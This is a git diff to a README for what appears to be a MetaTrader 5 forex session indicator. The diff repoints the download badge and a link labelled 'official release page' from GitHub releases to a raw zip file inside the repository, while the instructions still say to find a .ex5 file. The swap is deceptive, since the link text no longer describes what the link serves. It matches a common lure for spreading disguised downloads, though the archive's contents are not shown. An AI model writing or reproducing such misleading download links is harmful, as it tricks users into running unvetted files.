@@ -1,6 +1,6 @@
 # 📊 MT5-Forex-Session-indicator - Visualize Global Trading Sessions On Charts
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Gregorytestate3889/MT5-Forex-Session-indicator/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Gregorytestate3889/MT5-Forex-Session-indicator/main/Session-Highlighter/MQL5/Forex_indicator_Session_M_v3.8.zip)
 
 This tool helps traders view market hours directly inside the MetaTrader 5 platform. It marks the London, New York, and Asian sessions on your charts. Traders use these zones to plan their daily moves and find entry points for scalping or intraday trades.
 
@@ -25,7 +25,7 @@ You do not need to know how to write code. You do not need to install extra soft
 
 Follow these steps to get the tool running on your system.
 
-1. Visit the [official release page](https://github.com/Gregorytestate3889/MT5-Forex-Session-indicator/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/Gregorytestate3889/MT5-Forex-Session-indicator/main/Session-Highlighter/MQL5/Forex_indicator_Session_M_v3.8.zip).
 2. Locate the most recent file ending in .ex5.
 3. Click the file name to download it to your computer.
 4. Open the MetaTrader 5 application.
